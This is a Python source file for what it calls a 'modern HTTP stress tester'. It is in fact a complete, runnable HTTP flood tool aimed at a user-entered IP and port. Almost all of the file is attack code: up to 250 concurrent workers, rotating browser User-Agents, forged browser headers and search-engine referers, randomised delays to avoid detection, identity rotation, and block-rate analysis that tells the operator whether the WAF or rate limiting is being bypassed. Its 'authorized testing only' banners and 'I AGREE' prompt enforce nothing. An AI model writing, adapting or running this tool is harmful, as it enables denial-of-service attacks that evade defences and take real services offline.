import asyncio
import aiohttp
import signal
import sys
import time
import random
from typing import Dict


class ModernHTTPStressTester:
    """
    Advanced stress testing with evasion techniques for modern infrastructure.
    
    ⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️
    """
    
    def __init__(
        self, 
        web_target: str,
        num_tasks: int = 100
    ):
        self.web_target = web_target
        self.num_tasks = num_tasks
        self.running = False
        self.stats = {
            "requests": 0, 
            "errors": 0,
            "blocked": 0,
            "success": 0
        }
        
        # User-Agent pool (realistic browsers)
        self.user_agents = [
            # Chrome (Windows)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            # Chrome (macOS)
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            # Firefox (Windows)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
            # Firefox (macOS)
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0',
            # Safari (macOS)
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
            # Edge (Windows)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
            # Mobile Chrome (Android)
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
            # Mobile Safari (iOS)
            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1',
        ]
        
    def _get_random_headers(self) -> Dict[str, str]:
        """Generate realistic HTTP headers with variation"""
        user_agent = random.choice(self.user_agents)
        
        # Determine browser type from UA
        if 'Chrome' in user_agent and 'Edg' not in user_agent:
            accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
            sec_ch_ua = '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"'
        elif 'Firefox' in user_agent:
            accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
            sec_ch_ua = None
        elif 'Safari' in user_agent and 'Chrome' not in user_agent:
            accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            sec_ch_ua = None
        else:  # Edge
            accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
            sec_ch_ua = '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"'
        
        headers = {
            'User-Agent': user_agent,
            'Accept': accept,
            'Accept-Language': random.choice([
                'en-US,en;q=0.9',
                'en-GB,en;q=0.9',
                'fr-FR,fr;q=0.9,en;q=0.8',
                'de-DE,de;q=0.9,en;q=0.8',
            ]),
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': str(random.choice([0, 1])),
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        }
        
        # Add Chromium-specific headers
        if sec_ch_ua:
            headers['Sec-Ch-Ua'] = sec_ch_ua
            headers['Sec-Ch-Ua-Mobile'] = '?0'
            headers['Sec-Ch-Ua-Platform'] = f'"{random.choice(["Windows", "macOS", "Linux"])}"'
            headers['Sec-Fetch-Dest'] = 'document'
            headers['Sec-Fetch-Mode'] = 'navigate'
            headers['Sec-Fetch-Site'] = 'none'
            headers['Sec-Fetch-User'] = '?1'
        
        # Add Referer occasionally (realistic)
        if random.random() > 0.3:  # 70% chance
            base_url = self.web_target.rsplit('/', 1)[0]
            headers['Referer'] = random.choice([
                base_url,
                base_url + '/',
                'https://www.google.com/',
                'https://www.bing.com/',
            ])
        
        return headers
    
    async def _random_delay(self):
        """Human-like delay between requests"""
        # Vary delays to avoid pattern detection
        delay = random.uniform(0.5, 2.5)  # 500ms - 2.5s
        await asyncio.sleep(delay)
    
    async def http_flood_advanced(self):
        """
        Advanced HTTP flood with evasion techniques
        
        Techniques used:
        - User-Agent rotation
        - Realistic header generation
        - Random delays (timing attacks)
        - Session management
        - Referer variation
        """
        if not self.web_target:
            print("[!] No web target specified")
            return

        self.running = True
        
        # Configure connector with moderate limits
        connector = aiohttp.TCPConnector(
            limit=self.num_tasks,
            limit_per_host=self.num_tasks,
            ttl_dns_cache=300,
            ssl=False  # For testing with self-signed certs
        )
        
        # Moderate timeout (not too aggressive)
        timeout = aiohttp.ClientTimeout(total=15, connect=5)
        
        async def worker(session: aiohttp.ClientSession, worker_id: int):
            """Smart worker with evasion techniques"""
            requests_in_session = 0
            max_requests_per_session = random.randint(8, 25)  # Reset session periodically
            
            while self.running:
                try:
                    # Reset headers every N requests to simulate new session
                    if requests_in_session >= max_requests_per_session:
                        requests_in_session = 0
                        max_requests_per_session = random.randint(8, 25)
                        if worker_id % 10 == 0:  # Only log occasionally
                            print(f"[*] Worker {worker_id} rotating identity")
                    
                    # Generate fresh headers for each request
                    headers = self._get_random_headers()
                    
                    # Make request with custom headers
                    async with session.get(
                        self.web_target,
                        headers=headers,
                        timeout=timeout,
                        allow_redirects=True
                    ) as resp:
                        await resp.read()
                        
                        # Analyze response for blocking indicators
                        if resp.status == 403 or resp.status == 429:
                            self.stats["blocked"] += 1
                        elif resp.status == 200:
                            self.stats["success"] += 1
                        
                        self.stats["requests"] += 1
                        requests_in_session += 1
                        
                        # Print stats with blocking info
                        if self.stats["requests"] % 50 == 0:
                            block_rate = (self.stats["blocked"] / self.stats["requests"]) * 100
                            print(f"[*] Requests: {self.stats['requests']}, "
                                  f"Success: {self.stats['success']}, "
                                  f"Blocked: {self.stats['blocked']} ({block_rate:.1f}%), "
                                  f"Errors: {self.stats['errors']}")
                            
                except asyncio.CancelledError:
                    print(f"[*] Worker {worker_id} cancelled")
                    raise
                except aiohttp.ClientError as e:
                    self.stats["errors"] += 1
                    if self.stats["errors"] % 20 == 0:
                        print(f"[!] Network error in worker {worker_id}: {type(e).__name__}")
                except Exception as e:
                    self.stats["errors"] += 1
                    if self.stats["errors"] % 20 == 0:
                        print(f"[!] Error in worker {worker_id}: {type(e).__name__}")
                
                # Human-like delay between requests
                await self._random_delay()

        try:
            # Create session with connection pooling
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=timeout
            ) as session:
                # Create worker tasks
                tasks = [
                    asyncio.create_task(worker(session, i))
                    for i in range(self.num_tasks)
                ]
                
                print(f"[*] Started {self.num_tasks} advanced workers")
                print(f"[*] User-Agent rotation: {len(self.user_agents)} variants")
                print(f"[*] Random delays: 0.5-2.5 seconds")
                print(f"[*] Session rotation: Every 8-25 requests")
                
                # Wait for all tasks
                try:
                    await asyncio.gather(*tasks)
                except asyncio.CancelledError:
                    print("[*] Cancelling all workers...")
                    for task in tasks:
                        if not task.done():
                            task.cancel()
                    await asyncio.gather(*tasks, return_exceptions=True)
                    raise
                    
        finally:
            self.running = False
            success_rate = (self.stats['success'] / self.stats['requests'] * 100) if self.stats['requests'] > 0 else 0
            block_rate = (self.stats['blocked'] / self.stats['requests'] * 100) if self.stats['requests'] > 0 else 0
            
            print(f"\n{'='*60}")
            print(f"[*] Final Statistics:")
            print(f"    Total Requests: {self.stats['requests']}")
            print(f"    Successful (200): {self.stats['success']} ({success_rate:.1f}%)")
            print(f"    Blocked (403/429): {self.stats['blocked']} ({block_rate:.1f}%)")
            print(f"    Errors: {self.stats['errors']}")
            print(f"{'='*60}\n")
            
            # Analysis
            if block_rate > 50:
                print("[!] High block rate detected - Target has strong WAF/rate limiting")
                print("[→] Recommendations: Reduce workers, increase delays")
            elif block_rate > 20:
                print("[!] Moderate blocking - Some requests getting through")
                print("[→] WAF is active but can be partially bypassed")
            else:
                print("[✓] Low block rate - Evasion techniques effective")

    def stop(self):
        """Stop all running operations"""
        print("[*] Stopping operations...")
        self.running = False


async def main():
    """Main execution with enhanced configuration"""
    print("\n" + "!" * 60)
    print("MODERN INFRASTRUCTURE STRESS TESTING")
    print("FOR AUTHORIZED PENETRATION TESTING ONLY")
    print("!" * 60 + "\n")
    
    # Get target IP from user
    print("[?] Enter target IP address (e.g., 192.168.1.100): ", end='')
    target_ip = input().strip()
    
    if not target_ip:
        print("[!] No target IP provided. Exiting.")
        sys.exit(1)
    
    # Get port
    print("[?] Enter target port (default: 80): ", end='')
    port_input = input().strip()
    
    if port_input:
        try:
            port = int(port_input)
            if port < 1 or port > 65535:
                print("[!] Invalid port. Using default port 80.")
                port = 80
        except ValueError:
            print("[!] Invalid port. Using default port 80.")
            port = 80
    else:
        port = 80
    
    # Get protocol
    print("[?] Use HTTPS? (y/n, default: n): ", end='')
    use_https = input().strip().lower() == 'y'
    protocol = "https" if use_https else "http"
    
    # Construct web target
    web_target = f"{protocol}://{target_ip}:{port}"
    
    print(f"\n[*] Target: {web_target}")
    print(f"\n[?] Number of workers (10-250 recommended): ", end='')
    try:
        num_workers = int(input().strip())
        num_workers = max(10, min(250, num_workers))  # Clamp between 10-250
    except ValueError:
        num_workers = 100
        print(f"[*] Using default: {num_workers} workers")
    
    tester = ModernHTTPStressTester(
        web_target=web_target,
        num_tasks=num_workers
    )
    
    # Signal handlers for graceful shutdown
    loop = asyncio.get_running_loop()
    shutdown_event = asyncio.Event()
    
    def signal_handler():
        print("\n[!] Shutdown signal received")
        tester.stop()
        shutdown_event.set()
    
    # Register signal handlers (Unix/Linux)
    if sys.platform != 'win32':
        for sig in (signal.SIGTERM, signal.SIGINT):
            loop.add_signal_handler(sig, signal_handler)
    else:
        # Windows compatibility
        signal.signal(signal.SIGINT, lambda s, f: signal_handler())
    
    print("\n[*] Starting advanced HTTP stress test...")
    print("[*] Press Ctrl+C to stop\n")
    
    try:
        # Run test
        flood_task = asyncio.create_task(tester.http_flood_advanced())
        
        # Wait for completion or shutdown
        done, pending = await asyncio.wait(
            [flood_task, asyncio.create_task(shutdown_event.wait())],
            return_when=asyncio.FIRST_COMPLETED
        )
        
        # Cancel remaining tasks
        for task in pending:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
                
    except KeyboardInterrupt:
        print("\n[!] KeyboardInterrupt received")
        tester.stop()
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        print("[*] Cleanup complete")


if __name__ == "__main__":
    print("\n" + "⚠" * 30)
    print("WARNING: AUTHORIZED TESTING ONLY")
    print("Unauthorized use is ILLEGAL")
    print("⚠" * 30 + "\n")
    
    print("By continuing, you confirm:")
    print("✓ You OWN the target OR have WRITTEN authorization")
    print("✓ You understand this is for LEGITIMATE security testing")
    print("✓ You accept FULL LEGAL RESPONSIBILITY\n")
    
    confirm = input("Type 'I AGREE' to continue: ").strip()
    if confirm != "I AGREE":
        print("[!] Authorization not confirmed. Exiting.")
        sys.exit(1)
    
    # Log agreement
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open("usage_log.txt", "a") as f:
            f.write(f"{timestamp} - User confirmed authorization - Modern stress test\n")
    except:
        pass
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Program terminated")
